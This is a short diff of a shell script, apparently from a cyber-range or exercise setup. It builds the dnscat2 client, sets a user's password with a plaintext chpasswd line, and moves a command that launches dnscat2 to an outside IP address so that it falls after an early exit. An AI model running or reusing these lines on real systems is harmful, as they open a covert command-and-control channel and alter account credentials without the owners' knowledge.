@@ -46,7 +46,8 @@ cd dnscat2/client/
 make
 ## --verify password for Sys Admin
 echo "Vanessa_Cohen:Y71N1" | chpasswd
-## -- start dsncat2 client
-/dnscat2/client/dnscat --dns server=207.192.153.100 &
 # --signals completion
 $signal_ms3_complete
+exit 1003
+## -- start dsncat2 client
+/dnscat2/client/dnscat --dns server=207.192.153.100 &
